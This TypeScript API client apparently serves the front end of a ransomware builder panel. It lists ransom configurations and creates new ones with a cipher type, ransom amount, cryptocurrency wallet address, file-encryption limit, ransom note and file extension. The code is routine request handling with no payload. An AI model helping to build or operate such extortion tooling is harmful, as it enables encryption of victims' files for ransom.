import {axiosInstance, queryKeys} from "./apiConfig";
import {useMutation, useQuery, useQueryClient} from "@tanstack/react-query";
import Ransom from "../model/ransom";
import {CryptoType} from "../model/cryptoType";
import {CipherType} from "../model/cipherType";

function getAllRansoms() {
    return axiosInstance.get<Ransom[]>("/ransoms/list");
}

function createPremakeRansom(ransom: Ransom) {
    return axiosInstance.post<Ransom>("/ransoms", {
        cipherType: CipherType[ransom.cipherType],
        cryptoAmount: ransom.cryptoAmount,
        cryptoType: CryptoType[ransom.cryptoType],
        cryptoAddress: ransom.cryptoAddress,
        maxEncrypt: ransom.maxEncrypt,
        message: ransom.message,
        extension: ransom.extension,
        description: ransom.description,
        name: ransom.name,
    });
}

export function useAllRansoms() {
    return useQuery([queryKeys.RANSOMS_GET_ALL], getAllRansoms);
}

export function useCreatePremakeRansom(mutationOptions: any) {
    const queryClient = useQueryClient();
    return useMutation((ransom: Ransom) => createPremakeRansom(ransom), {
        ...mutationOptions,
        onSuccess: (data: Ransom) => {
            queryClient.invalidateQueries([queryKeys.RANSOMS_GET_ALL]);
        }
    });
}
